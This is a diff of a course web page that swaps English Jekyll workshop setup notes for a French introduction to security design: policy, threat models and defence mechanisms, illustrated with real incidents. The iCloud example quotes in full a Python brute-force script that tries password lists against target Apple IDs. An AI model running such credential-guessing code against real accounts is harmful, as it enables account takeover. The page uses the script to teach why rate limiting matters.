@@ -1,85 +1,177 @@
 ---
-title: 0-Prep
+title: Introduction 
 nav: true
 ---
 
-# Workshop Prep
+# Qu'est ce que la sécurité? 
 
-To get ready for this workshop, please create a free [GitHub account](https://github.com/join){:target="_blank"} if you do not have one already.
-That is all you really need! 
+En une phrase: atteindre un certain but en présence d'adversaires.
+Très souvent les systèmes sont connectés à Internet, qui cache des adversaires. Ainsi, le *design* ou architecture de ces systèmes doit prendre en compte la présence de ces acteurs malveillants, i.e en d'autres termes est ce que le système peut effectuer correctement sa tâche en présence d'adversaires?
 
-This workshop introduces GitHub Pages using GitHub's web interface, demonstrating several ways to create gh-pages without using Jekyll locally.
-Basic familiarity with the GitHub web interface and HTML will be helpful. 
-For quick introductions check out GitHub's [Hello World guide](https://guides.github.com/activities/hello-world/){:target="_blank"} and w3schools [HTML Tutorial](https://www.w3schools.com/html/default.asp){:target="_blank"}.
 
-# Optional Prep *[optional!]*
+# Plan général:
+Penser la sécurité est un exercice extrêmement difficile en raison de la complexité du sujet. C'est pour cela qu'on va tenter une approche par segment, en déconstruisant le problème en 3 sous-problèmes.
 
-For more advanced uses of GitHub Pages and Jekyll you will want a text editor, Git, Ruby, and Jekyll installed on your computer.
-The instructions below will set up your local development environment and provide a bit of background.
+- **La stratégie**: Le but que l'on se fixe. (i.e Raymond Deubaze doit pouvoir lire le fichier F mais ne peut pas le modifier).
+- **Le modèle de menace**: Les hypothèses formulées à propos de l'attaquant. (i.e L'attaquant peut deviner les mot de passe, n'a pas accès physiquement au serveur...) Il est plus agile et conseillé d'assumer le pire en terme des choses que peut faire l'attaquant.
+- **Le mécanisme de défense**: Les différentes poignées su système qui permettre de garantir le bon fonctionnement de la stratégie (i.e les comptes utilisateurs, les mots de passe, les permissions et privilèges des fichiers, les cryptages de données... ).
 
-## Text Editor
+L'objectif final donc est de garantir la *stratégie* sachant le *modèle de menace* via le *mécanisme de défense*. 
 
-When working with code you should have a good text editor.
-Word processors such as MS Word can not be used to create or edit code.
-Windows Notepad does not handle UTF-8 encoding or UNIX line endings that are standard for cross platform applications. 
-For basic editing, Windows [Notepad++](https://notepad-plus-plus.org/), Mac TextEdit, or Linux Gedit are sufficient.
-However, a more complete code editor will be helpful for managing Jekyll projects.
+Nous verrons qu'il suffit d'une faille dans une seule de ces sous-catégories, peut provoquer l'effondrement de tout le système même si les deux autres sous-catégories sont parfaitement conçues!
 
-Open-source cross platform suggestions:
+Il est difficile de penser à tous les moyens possibles pour contourner la sécurité, car c'est un problème ouvert à une infinité d'éventualités. Chaque maillon de la chaîne importe, et les plus faibles encore plus.
 
-- [Visual Studio Code](https://code.visualstudio.com/)
-- [Atom](https://atom.io/)
+C'est pourquoi on ne peut s'intéresser à la sécurité en dernière étape, une fois qu'on a fini de développer notre système, mais qu'il faut s'y prendre de manière itérative tout au long du développement: Conception du système, mise à jour du modèle de menace au dur et à mesure...
 
-## Install Git
+Rien de mieux pour faire le tour de ces sous-concepts en prenant des exemples de la vie réelle:
 
-[Git](https://git-scm.com/) is a [free](https://www.gnu.org/philosophy/free-sw.en.html), [distributed](https://en.wikipedia.org/wiki/Distributed_version_control) version control system, a piece of software on your computer. 
-[GitHub](https://github.com/) is a Git repository hosting service, a place to store and sync your work in the cloud.
-Your GitHub Pages projects will be under Git version control, so you need the software on your machine. 
+# Failles au niveau de la stratégie:
 
-Installing it is pretty straightforward:
+ 
+- [Compte email de Sarah Palin](https://en.wikipedia.org/wiki/Sarah_Palin_email_hack)
+    - Les comptes Yahoo ont un username, un mot de passe et des questions de sécurité. L'utilisateur peut se connecter en fournissant son username ainsi que son mot de passe.
+    - Si le mot de passe est oublié, il peut être réinitialisé grâce aux questions de sécurité. Un des inconvénients de cette méthode est que les questions de sécurité sont plus faciles à deviner que les mots de passe en général.
+    - Un jeune adolescent voulant nuire à la réputation de Sarah Palin a deviné les réponses secrètes de cette dernière en quelques minutes en se reportant à sa page Wikipédia.
+    - Cette faille a montré un désavantage à l'utilisation des questions dans la **stratégie du système**. Celles ci rendent dans certains cas obsolètes la notion de mot de passe qui est alors facilement contourné.
 
-- **Windows:** install [Git for Windows](https://git-for-windows.github.io/){:target="_blank"} using the default options, except when setup asks you to choose the default editor used by Git, select "Use the Nano editor by default". This will give you Git, Git Bash, and Git GUI. Git Bash is a great terminal that lets you use UNIX style commands and utilities on Windows.
-- **Mac:** check if Git is already installed by opening terminal and typing `git --version`. If you do not have it, your system will often prompt you to install "Xcode Command Line Tools"--follow the prompt as this package is necessary for Ruby as well. Alternatively, type `xcode-select --install` to start the process. If you want a newer version, download the official [Mac git installer](https://git-scm.com/downloads){:target="_blank"} or use Homebrew.
-- **Linux:** install from your distribution's software center or package manager (for Ubuntu `sudo apt install git`).
 
-If you are interested in using a visual GUI application integrated with GitHub, Windows and Mac users should also install [GitHub Desktop](https://desktop.github.com/){:target="_blank"} using the default options.
-You can install GitHub Desktop in addition to other versions of Git.
 
-There are other [GUI apps available](https://git-scm.com/downloads/guis){:target="_blank"} for managing and visualizing Git repositories, including Linux options.
 
-## Install Ruby
+- [Comptes Amazon, Apple, Google, etc. de Mat Honan](https://www.wired.com/gadgetlab/2012/08/apple-amazon-mat-honan-hacking/all/)
 
-[Ruby](https://www.ruby-lang.org/en/){:target="_blank"} is a fairly young and developing programming language with some unique features. 
-To use Jekyll, *you do not need to know anything about Ruby*, but if you are curious, check out [Ruby in 20 minutes](https://www.ruby-lang.org/en/documentation/quickstart/){:target="_blank"}.
+    - Pour régénérer le mot de passe, **Gmail** vous envoie un mail de vérification à une autre adresse mail de backup. Par soucis d'aider l'utilisateur à s'en souvenir, Gmail dévoile une partie de l'adresse mail à laquelle il a envoyé le lien de réinitialisation. Dans le cas de Mat Honan, l'adresse de backup était son adresse Apple *...@me.com*. 
+    - Pour réinitialiser le mot de passe, le compte Apple vous demande votre adresse ainsi que les 4 derniers chiffre de votre carte de crédit enregistrée chez eux. 
+    - Dans le cas d'Amazon, (en tout cas à l'époque) n'importe qui avait le droit d'acheter avec un compte sans avoir à s'authentifier du moment qu'il enregistre une nouvelle carte de crédit et qu'il achète avec cette même carte de crédit. Tout ce que l'attaquant a fait c'est d'ajouter une carte de crédit, ensuite il a réinitialisé le *mdp* Amazon qui lui aussi ne demandait que les 4 derniers chiffres de la carte de crédit pour cela. L'attaquant a donc utilisé sa propre carte pour réinitialisé le *mdp*, puis une fois à l'intérieur du compte il a obtenu les 4 derniers chiffres de la carte du vrai propriétaire du compte (Mat Honan), et c'est ainsi qu'il a pu entrer dans son compte Apple puis Gmail.
 
-Frustratingly, different versions have many dependency and incompatibility problems.
-Because of these issues, many use Ruby Managers, such as [RVM](http://rvm.io/){:target="_blank"}, to install and switch between versions.
-However, if you are just interested in working with Jekyll, using an installer for your OS should be sufficient.
-Jekyll requires a Ruby version > 2.2.5.
 
-- **Windows:** Use [RubyInstaller for Windows](https://rubyinstaller.org/){:target="_blank"}. 
-    - First, [download](https://rubyinstaller.org/downloads/){:target="_blank"} the suggested stable version "WITH DEVKIT" (as of this writing, Ruby+Devkit 2.5.X (x64)) and double click to install. Use the install defaults, but make sure "Add Ruby executables to your PATH" is checked. On the final step, ensure the box to start the MSYS2 DevKit is checked.
-    - Second, the installer will open a terminal window with options to install MSYS2 DevKit components. Choose option 3, "MSYS2 and MINGW development toolchain", or simply press ENTER to install all the necessary dependencies. The installer will proceed through a bunch of steps outputting a bunch of text in the terminal window--*eventually*, this will conclude and you should see a message with success in it. If the window doesn't close, press Enter again or manually close it. (The installer can be restarted by typing `ridk install` into a command prompt)
-- **Mac:** OS X has a version of Ruby installed by default. Check the version with `ruby -v`. If it is > 2.2.5 you can use the system Ruby. 
-    - A newer version can be installed using [Homebrew](https://brew.sh/){:target="_blank"}, `brew install ruby`, or a manager such as [rbenv](https://github.com/rbenv/rbenv){:target="_blank"}. Check the official Jekyll [Mac install docs](https://jekyllrb.com/docs/installation/macos/){:target="_blank"} for tips. 
-    - Ensure you have Xcode Command Line Tools, if not use `xcode-select --install` to start the installer.
-- **Linux:** Even though the version will not be the most up-to-date, the simplest method is to use your distro's repositories. For example on Ubuntu, `sudo apt install ruby-full`. Check `ruby -v` to make sure the repository version is > 2.2.5. See the official Jekyll [Ubuntu install docs](https://jekyllrb.com/docs/installation/ubuntu/){:target="_blank"} for more details.
-    - For a more up-to-date version, use a manager such as [RVM](http://rvm.io/){:target="_blank"} ([Ubuntu tips](https://evanwill.github.io/_drafts/notes/ruby-notes.html){:target="_blank"})
-    - You will also need some build tools (Make and GCC), on Ubuntu get them with `sudo apt install build-essential`.
 
-## Install Jekyll
+### Comment résoudre les problèmes à ce stade:
 
-> Note: Jekyll does not officially support Windows, however it is cross platform and works fine (they just don’t officially write windows documentation or check for bugs). 
-> There is a [Jekyll on Windows](https://jekyllrb.com/docs/installation/windows/) page, but it can be out of date and inaccurate.
+Il faut vraiment penser aux conséquences et aller jusqu'au bout du raisonnement concernant la stratégie. Le plus compliqué c'est de considérer les failles dans les systèmes distribués, où on ne contrôle pas ce que chacun fait.
 
-Jekyll is a Gem, a software package installed via Ruby's management system called RubyGems (similar to Python's Pip). 
-Open a terminal and type:
+# Failles au niveau du modèle de menace:
+Le problème avec le modèle de menace (i.e l'ensemble des suppositions faites lors de la conception) est que les hypothèses formulées sont généralement liées à un certain contexte prédéfini, comme on va l'observer dans les cas suivants. Cependant même si ces suppositions s'avèrent perspicaces au moment où elles sont faites, le contexte lui même risque d'évoluer et risque de mettre à mal le modèle par la suite:
 
-`gem install jekyll bundler`
+- Facteur humain
+    - Souvent le facteur humain est écarté (à tort) des éventuelles menaces. Mais c'est une erreur classique: Il suffit qu'un utilisateur pas très concentré clique sur un lien d'un email (Phishing) frauduleux, pour qu'il installe à son insu le malware sur son système. Ce qui est encore plus grave si celui ci dispose de droits privilégiés. Un autre exemple classique est que l'employé d'une entreprise reçoive un appel très persuasif de la part d'un prétendu chef pour qu'il fasse fuiter des informations comprométentes.
 
-This will take a minute as Gem installs all the dependencies and builds extensions (on Windows it may appear as if nothing is happening, but be patient!). 
+- Kerberos
+    - L'exemple de Kerberos illustre parfaitement le fait que les suppositions du modèle de menace sont profondémenet ancrées dans un contexte particulier.
+    Kerberos est un protocole d'authentification crée par le MIT au milieu des années 80, qui se basait sur une clé 56-bit DES. À l'époque vérifier les 2^56 possibilités semblait impossible.
+    Aujourd'hui ça ne doit pas couter plus que 80€ (https://www.cloudcracker.com/dictionaries.html).
 
-> Note: Linux users may need to `sudo`, to avoid this install Ruby using [RVM](http://rvm.io/) or add a gem install directory to `.bashrc`.
-> On Windows, if `gem` returns an error about secure connections, it may be necessary to update to a newer version of RubyGems as some versions have out of date SSL certificates.
-> Manually install the newer version by downloading the [RubyGems zip package](https://rubygems.org/pages/download#formats).
-> Unzip the package, then run `ruby setup.rb` in the directory.
+- Exemple de faille de hardware
+    - Si vous faites confiance à votre Hardware, vous avez interêt à ce le votre adversaire ne soit pas [la NSA](https://www.schneier.com/blog/archives/2013/12/more_about_the.html). 
+
+- Hors d'Internet, hors de danger ?
+    - C'est ce que semblait croire [les autorités iraniennes à l'époque de Stuxnet](https://fr.wikipedia.org/wiki/Stuxnet). Pourtant leur système était à priori non atteignable par réseau Internet. **Cette hypothèse pourtant à l'air de mettre en sécurité tout le réseau interne d'adversaire externe**. 
+    Et pourtant, le virus Stuxnet s'est propagé spécialement en Iran, par Internet et restait parfaitement inactif tant que le système sur lequel il se trouvait n'était pas celui des réacteurs nucléaires. Et à force de se propager il a fini par atterir sur des clés USB d'employés de la station nucléaire iranienne.
+
+### Comment résoudre les problèmes à ce stade:
+Il faut expliciter le plus possible les modèles de menace afin de voir plus facilement les possibles failles.
+
+
+# Failles au niveau du mécanisme de défense:
+
+- [Cas d'iCloud d'Apple](https://github.com/hackappcom/ibrute):
+    - Très souvent les gens choisissent des mots de passe *faibles* et ont droit à plusieurs tentatives de login dans le cas où ils ne s'en souviennent pas. 
+    La plupart des services fournis par iCloud d'Apple contenaient cette fonction qui limite le nombre d'essais. Le seul problème est qu'il y'avait un seul service ("find my iPhone") qui ne comptait pas le nombre de tentatives. L'adversaire pouvait en un petit script faire autant de tentatives qu'il lui plaisait, aussi rapidement que le transferts de paquet via Internet (porbablement plusieurs millions de tentatives par jour). Un [tel script](https://github.com/hackappcom/ibrute) n'est pas du tout compliqué à mettre en place comme on peut le voir ici: 
+    ```
+        import json
+        import urllib2
+        import plistlib
+        from xml.dom.minidom import *
+        from lxml import etree
+        import unicodedata
+        import re
+        import xml.etree.ElementTree
+        import time
+        import random
+        import json
+        import cookielib
+        import urllib
+        import time
+        import socket
+        import base64
+        from time import strftime
+
+
+        import socket
+
+        def TryPass(apple_id,password):
+
+
+            url = 'https://fmipmobile.icloud.com/fmipservice/device/'+apple_id+'/initClient'
+
+            headers = {
+                'User-Agent': 'FindMyiPhone/376 CFNetwork/672.0.8 Darwin/14.0.0',
+                }
+
+            json = {
+            "clientContext": {
+            "appName": "FindMyiPhone",
+            "osVersion": "7.0.4",
+            "clientTimestamp": 429746389281,
+            "appVersion": "3.0",
+            #make it random!
+            "deviceUDID": "0123456789485ef5b1e6c4f356453be033d15622",
+            "inactiveTime": 1,
+            "buildVersion": "376",
+            "productType": "iPhone6,1"
+            },
+            "serverContext": {}
+            }
+
+            req_plist=plistlib.writePlistToString(json)
+
+            req = urllib2.Request(url, req_plist, headers=headers)
+            base64string = base64.encodestring('%s:%s' % (apple_id, password)).replace('\n', '')
+            req.add_header("Authorization", "Basic %s" % base64string)
+
+
+
+            try:
+                resp = urllib2.urlopen(req)
+            except urllib2.HTTPError, err:
+                if err.code == 401:
+                    return False
+                if err.code == 330:
+                    return True
+
+            return 'bad'
+        ```
+        Il suffit maintenant de lire un fichier contenant les emails cibles ainsi que le fichier contenant tous les mots de passes faibles et en faisant une double boucle sur ces deux listes, le tour est joué:
+        ```
+        with open('passlist.txt', 'r') as file:
+            passwords = file.read()
+
+
+        with open('mails.txt', 'r') as file:
+            apple_ids = file.read()
+
+
+
+        for apple_id in apple_ids.split('\n'):
+            if apple_id:
+                print 'Working with:',apple_id
+                for pwd in passwords.split('\n'):
+                    if pwd:
+                        #print pwd
+                        password = pwd.split(' ')[1]
+                        print 'Trying: ', apple_id,password
+                        
+                        try:
+                            result = TryPass(apple_id,password)
+                            if result == True:
+                                print 'Got It!: ', apple_id,password
+                            if result == 'bad':
+                                print 'We are blocked!: ',apple_id,password
+                        except:
+                            print 'Protocol failed ',pwd
+
+        ```
+
+
+- [Bitcoin via Android](https://bitcoin.org/en/alert/2013-08-11-android)
+    - Le bitcoin d'un compte peut être dépensé par quiconque connaît la clé privée de ce compte. Or en 2013 plusieurs applications Android ui gèrent les portefeuilles bitcoin utilisaient [l'API Java: SecureRandom](https://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html). Or il se trouvait que ce système utilise un générateur de nombre aléatoire comme le décrit la doc *"Many SecureRandom implementations are in the form of a pseudo-random number generator (PRNG), which means they use a deterministic algorithm to produce a pseudo-random sequence from a true random seed."*. Mais ce que peu de gens ont vu, c'est que le code comportait un petit bug, et que dans certains cas particuliers, le système oubliait de donner de *seed* à PRNG. En conséquence beaucoup de clés privées ont été très faciles à deviner par les attaquants qui ont dépensé tous les bitcoins qui leur passaient par les mains. 
